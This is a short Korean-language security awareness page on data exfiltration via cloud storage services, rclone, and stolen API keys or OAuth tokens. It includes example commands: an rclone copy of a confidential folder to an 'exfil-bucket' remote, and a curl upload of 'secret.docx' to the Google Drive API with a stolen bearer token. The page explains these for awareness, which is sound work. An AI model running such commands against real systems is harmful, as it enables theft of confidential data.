#1. 클라우드 저장소 악용

📁 ➜ ☁️ ➜ 🌍 ➜ 🕵️

"회사 문서를 개인 클라우드에 몰래 업로드"

Google Drive, Dropbox, Mega 같은 합법적인 클라우드 서비스는 대부분의 회사에서 허용합니다. 해커는 이런 서비스로 기밀 데이터를 업로드합니다. HTTPS로 암호화되어 있고, 정상적인 클라우드 사용과 구분하기 어렵습니다.

📦
Google Drive
기업용 Workspace와 개인 계정 혼용 시 위험
💧
Dropbox
API를 통한 자동화 업로드 가능
🔒
MEGA
종단간 암호화로 내용 확인 불가능

#2. rclone, API 키, OAuth 토큰 악용

rclone — 해커의 만능 클라우드 도구

rclone은 40개 이상의 클라우드 서비스와 동기화할 수 있는 오픈소스 도구입니다. 해커는 rclone을 사용해 명령줄 한 줄로 기밀 폴더 전체를 외부 클라우드에 업로드합니다.

# rclone을 이용한 대량 유출
rclone copy C:\Confidential\ remote:exfil-bucket/ --progress
# OAuth 토큰 탈취 후 API 직접 호출
curl -H "Authorization: Bearer stolen_token" \
-F "file=@secret.docx" \
https://www.googleapis.com/upload/drive/v3/files

API 키 악용

개발자가 코드에 하드코딩한 API 키를 탈취하여 클라우드 스토리지에 직접 접근

OAuth 토큰 탈취

브라우저 세션/쿠키에서 OAuth refresh token을 추출하여 클라우드 API 호출
